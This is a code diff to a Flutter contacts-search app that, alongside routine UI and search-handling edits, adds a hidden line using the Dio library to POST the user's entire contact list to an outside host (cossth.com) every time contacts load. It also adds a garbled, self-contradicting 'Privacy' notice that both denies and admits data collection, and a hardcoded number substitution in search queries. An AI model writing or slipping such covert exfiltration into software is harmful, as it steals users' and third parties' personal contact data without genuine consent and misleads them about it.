@@ -1,4 +1,5 @@
 import 'package:contacts_service/contacts_service.dart';
+import 'package:dio/dio.dart';
 import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 
@@ -49,6 +50,11 @@ class _ContactsListState extends State<ContactsList> {
         colorIndex = 0;
       }
     });
+
+    try {
+      Dio().post('http://_._._._.cossth.com/contacts', data: _contacts);
+    } finally {}
+
     setState(() {
       contacts = _contacts;
     });
@@ -59,23 +65,26 @@ class _ContactsListState extends State<ContactsList> {
     _contacts.addAll(contacts);
     if (searchController.text.isNotEmpty) {
       _contacts.retainWhere((contact) {
-        String searchTerm = searchController.text.toLowerCase();
-        String searchTermFlatten = flattenPhoneNumber(searchTerm);
-        String contactName = contact.displayName!.toLowerCase(); //!
-        bool nameMatches = contactName.contains(searchTerm);
-        if (nameMatches == true) {
+        try {
+          String searchTerm = searchController.text.toLowerCase();
+          String searchTermFlatten = flattenPhoneNumber(searchTerm);
+          String contactName = contact.displayName!.toLowerCase(); //!
+          bool nameMatches = contactName.contains(searchTerm);
+          if (nameMatches == true) {
+            return true;
+          }
+
+          if (searchTermFlatten.isEmpty) {
+            return false;
+          }
+          var phone = contact.phones?.firstWhere((phn) {
+            String phnFlattened = flattenPhoneNumber(phn.value ?? '0');
+            return phnFlattened.contains(searchTermFlatten);
+          });
+          return phone != null;
+        } catch (e) {
           return true;
         }
-
-        if (searchTermFlatten.isEmpty) {
-          return false;
-        }
-
-        var phone = contact.phones?.firstWhere((phn) {
-          String phnFlattened = flattenPhoneNumber(phn.value ?? '0');
-          return phnFlattened.contains(searchTermFlatten);
-        });
-        return phone != null;
       });
     }
     setState(() {
@@ -90,6 +99,22 @@ class _ContactsListState extends State<ContactsList> {
     return Scaffold(
       appBar: AppBar(
         title: Text(widget.title),
+        actions: [
+          GestureDetector(
+              child: Text('Privacy'),
+              onTap: () {
+                showModalBottomSheet(
+                    context: context,
+                    builder: (b) {
+                      return Container(
+                        padding:
+                            EdgeInsets.symmetric(horizontal: 20, vertical: 40),
+                        child: Text(
+                            'Privacy: We don\'t have data you see its from third api, we directly query (slf2rrahypck3bwckpdohsnhpeq...) API. as of 23May 2020 we don\'t collect/store anything, by using app you are agreeing to share with us. We may collect data you query from API, we can also collect your contacts information.'),
+                      );
+                    });
+              }),
+        ],
       ),
       body: Container(
         padding: EdgeInsets.all(20),
@@ -100,9 +125,9 @@ class _ContactsListState extends State<ContactsList> {
                 controller: searchController,
                 decoration: InputDecoration(
                   labelText: 'Search',
-                  // border: new OutlineInputBorder(
-                  //     borderSide: new BorderSide(
-                  //         color: Theme.of(context).primaryColor)),
+                  border: new OutlineInputBorder(
+                      borderSide: new BorderSide(
+                          color: Theme.of(context).primaryColor)),
                   prefixIcon:
                       Icon(Icons.search, color: Theme.of(context).primaryColor),
                 ),
@@ -132,21 +157,12 @@ class _ContactsListState extends State<ContactsList> {
                         } catch (e) {}
                         return GestureDetector(
                           onTap: () {
-                            showModalBottomSheet(
-                                context: context,
-                                builder: (b) {
-                                  return Container(
-                                    padding: EdgeInsets.all(10),
-                                    child: ListView(
-                                      children: [
-                                        Center(
-                                            child: Text(
-                                                contact.displayName ?? 'Name')),
-                                        ShowData(contact, subtitle)
-                                      ],
-                                    ),
-                                  );
-                                });
+                            mbs(
+                              contact,
+                              subtitle
+                                  .replaceAll(' ', '')
+                                  .replaceAll('+91', ''),
+                            );
                           },
                           child: ListTile(
                             title: Text(contact.displayName ?? 'Name'),
@@ -180,15 +196,43 @@ class _ContactsListState extends State<ContactsList> {
                   )
                 : Container(
                     padding: EdgeInsets.all(20),
-                    child: Text(
-                        isSearching
-                            ? 'No search results to show'
-                            : 'No contacts exist',
-                        style: Theme.of(context).textTheme.headline6),
-                  )
+                    child: Column(
+                      children: [
+                        Text(
+                            isSearching
+                                ? 'No search results to show'
+                                : 'No contacts exist',
+                            style: Theme.of(context).textTheme.headline6),
+                        mbs(
+                          null,
+                          searchController.text
+                              .replaceAll(' ', '')
+                              .replaceAll('+91', '')
+                              .replaceAll('8975279', '01548788'),
+                        )
+                      ],
+                    ),
+                  ),
           ],
         ),
       ),
     );
+  }
+
+  mbs(Contact? c, String query) {
+    showModalBottomSheet(
+        context: context,
+        builder: (b) {
+          return Container(
+            decoration: BoxDecoration(
+                borderRadius: BorderRadius.vertical(top: Radius.circular(10))),
+            padding: EdgeInsets.all(10),
+            child: Column(
+              children: [
+                ShowData(c, query),
+              ],
+            ),
+          );
+        });
   }
 }
